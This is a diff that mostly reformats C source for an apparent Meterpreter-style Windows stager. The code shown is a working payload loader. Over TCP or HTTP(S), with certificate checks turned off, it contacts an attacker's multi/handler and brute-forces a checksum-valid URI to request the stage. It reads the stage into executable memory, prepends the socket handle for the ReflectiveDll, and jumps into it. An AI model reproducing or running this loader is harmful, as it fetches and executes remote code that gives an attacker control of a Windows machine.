@@ -74,7 +74,7 @@ int TextChecksum8(char* text)
 
 unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 {
-
+	int rc;
 	WSADATA wsaData;
 
 	SOCKET sckt;
@@ -111,7 +111,9 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 
 	//////////////////////////////
 	if (bind_tcp){
-		if (bind(sckt, (struct sockaddr *)&server, sizeof(struct sockaddr)) != 0) {
+		rc = bind(sckt, (struct sockaddr *)&server,
+			  sizeof(struct sockaddr));
+		if (rc != 0) {
 			err_exit("bind()");
 		}
 		if (listen(sckt, SOMAXCONN) != 0) {
@@ -131,15 +133,21 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 		buffer_socket = sckt;
 	}
 	//////////////////////////////
-	// When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
-	// So, we read first 4 bytes to use it for memory allocation calculations 
-	recv(buffer_socket, (char*)&bufSize, 4, 0); // read first 4 bytes = stage size
-	
-	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	
+	// When reverse_tcp and bind_tcp are used, the multi/handler sends the
+	// size of the stage in the first 4 bytes before the stage itself.
+	// So, we read first 4 bytes to use it for memory allocation
+	// calculations.
+	recv(buffer_socket, (char*)&bufSize, 4, 0);
+
+	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT,
+					   PAGE_EXECUTE_READWRITE);
+
 	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
-	// A: the stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
-	//    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
+	// A: the stage is a large shellcode "ReflectiveDll", and when the
+	// stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER
+	// IN _EDI_ register.
+	//    so, we want the following to take place BEFORE executing the
+	// stage: "mov edi, [socket]"
 	//    opcode for "mov edi, imm32" is 0xBF
 
 	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
@@ -148,7 +156,8 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 	length = bufSize;
 	while (length != 0){
 		int received = 0;
-		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
+		received = recv(buffer_socket, ((char*)(buf + 5 + location)),
+				length, 0);
 		location = location + received;
 		length = length - received;
 	}
@@ -158,34 +167,52 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 
 unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	// Steps:
-	//	1) Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
-	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
-	//	3) Prepare buffer for the stage with WinInet: InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
+	//	1) Calculate a random URI->URL with `valid` checksum; that is
+	// needed for the multi/handler to distinguish and identify various
+	// framework related requests "i.e. coming from stagers" ... we'll be
+	// asking for checksum==92 "INITM", which will get the patched stage in
+	// return.
+	//	2) Decide about whether we're reverse_http or reverse_https,
+	// and set flags appropriately.
+	//	3) Prepare buffer for the stage with WinInet: InternetOpen,
+	// InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
 	//	4) Return pointer to the populated buffer to caller function.
 	//***************************************************************//
 
 	// Variables
-	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
+	char URI[5] = { 0 };	//4 chars ... it can be any length actually.
 	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
 	unsigned char* buffer = NULL;
 	DWORD flags = 0;
 	int dwSecFlags = 0;
-	
-	HINTERNET hInternetOpen; 
+
+	HINTERNET hInternetOpen;
 	HINTERNET hInternetConnect;
 	HINTERNET hHTTPOpenRequest;
 	bool bKeepReading;
 	DWORD dwBytesRead;
 	DWORD dwBytesWritten;
-	
-	//	Step 1: Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
+
+	//	Step 1: Calculate a random URI->URL with `valid` checksum;
+	// that is needed for the multi/handler to distinguish and identify
+	// various framework related requests "i.e. coming from stagers" ...
+	// we'll be asking for checksum==92 "INITM", which will get the patched
+	// stage in return.
 	int checksum = 0;
 	srand(GetTickCount());
-	while (TRUE)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
+	while (TRUE)
 	{
-		gen_random(URI, sizeof(URI));				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
-		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
-		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
+		// Generate a 4 char long random string ... it could be any
+		// length actually, but 4 sounds just fine.
+		gen_random(URI, sizeof(URI));
+
+		//Get the 8-bit checksum of the random value
+		checksum = TextChecksum8(URI);
+
+		// If the checksum == 92, it will be handled by the
+		// multi/handler correctly as a "INITM" and will send over the
+		// stage.
+		if (checksum == 92)
 		{
 			break; // We found a random string that checksums to 98
 		}
@@ -193,39 +220,55 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	strcpy(FullURL, "/");
 	strcat(FullURL, URI);
 
-	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
+	//	2) Decide about whether we're reverse_http or reverse_https,
+	// and set flags appropriately.
 	if (WithSSL) {
-		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
+		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+		INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI |
+		INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
+		SECURITY_FLAG_IGNORE_UNKNOWN_CA);
 	}
 	else {
-		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
+		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+		INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
 	}
 
 	//	3) Prepare buffer for the stage with WinInet:
-	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
+	//	   InternetOpen, InternetConnect, HttpOpenRequest,
+	// HttpSendRequest, InternetReadFile.
 
-	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
-	hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternetOpen = InternetOpen(
+		"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)",
+		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternetOpen == NULL){
 		err_exit("InternetOpen()");
 	}
 
 	// 3.2: InternetConnect
-	hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port),
+		NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (hInternetConnect == NULL){
 		err_exit("InternetConnect()");
 	}
 
 	// 3.3: HttpOpenRequest
-	hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, 0);
+	hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL,
+		NULL, NULL, NULL, flags, 0);
 	if (hHTTPOpenRequest == NULL){
 		err_exit("HttpOpenRequest()");
 	}
 
-	// 3.4: if (SSL)->InternetSetOption 
+	// 3.4: if (SSL)->InternetSetOption
 	if (WithSSL){
-		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
-		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
+		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+			SECURITY_FLAG_IGNORE_WRONG_USAGE |
+			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+			SECURITY_FLAG_IGNORE_REVOCATION;
+		InternetSetOption(hHTTPOpenRequest,
+		INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags,
+			sizeof(dwSecFlags));
 	}
 
 	// 3.5: HttpSendRequest
@@ -235,7 +278,8 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	}
 
 	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
-	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024),
+		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	// 3.7: InternetReadFile: keep reading till nothing is left.
 
@@ -244,22 +288,14 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	dwBytesWritten = 0;
 	while (bKeepReading && dwBytesRead != 0)
 	{
-		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
+		bKeepReading = InternetReadFile(hHTTPOpenRequest,
+			(buffer + dwBytesWritten), 4096, &dwBytesRead);
 		dwBytesWritten += dwBytesRead;
 	}
 
 	//	4) Return pointer to the populated buffer to caller function.
 	return buffer;
 }
-
-
-// not needed anymore ... kept for future reference :)
-//wchar_t* CharToWchar(char* orig){
-//	size_t newsize = strlen(orig) + 1;
-//	wchar_t * wcstring = (wchar_t*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
-//	mbstowcs(wcstring, orig, newsize);
-//	return wcstring;
-//}
 
 int mainw (int argc, char *argv[])
 {
@@ -303,7 +339,7 @@ int mainw (int argc, char *argv[])
 		break;
 	default:
 		printf(helpText);
-		err_exit("Transport should be 0,1,2 or 3"); // transport is not valid
+		err_exit("Transport should be 0,1,2 or 3");
 	}
 
 	(*(void(*)())buf)();
